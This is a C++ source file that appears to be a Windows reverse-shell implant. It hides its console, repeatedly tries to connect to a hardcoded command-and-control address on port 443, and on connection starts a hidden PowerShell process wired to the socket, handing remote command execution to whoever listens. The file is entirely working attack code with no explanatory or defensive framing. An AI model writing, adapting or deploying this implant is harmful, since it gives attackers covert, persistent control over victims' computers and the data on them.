#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

int main(int argc, char* argv[]) {
	FreeConsole();

	while (true) {
		Sleep(5000);    // 1000 = One Second

		char C2Server[] = "127.0.0.1";
		int C2Port = 443;
		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		inet_pton(AF_INET, C2Server, &addr.sin_addr);  //IP received from main function
		addr.sin_port = htons(C2Port);     //Port received from main function

		//Connecting to Proxy/ProxyIP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)& addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else {
			wchar_t Process[] = L"powershell.exe";
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.wShowWindow = SW_HIDE;
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
		}
	}
}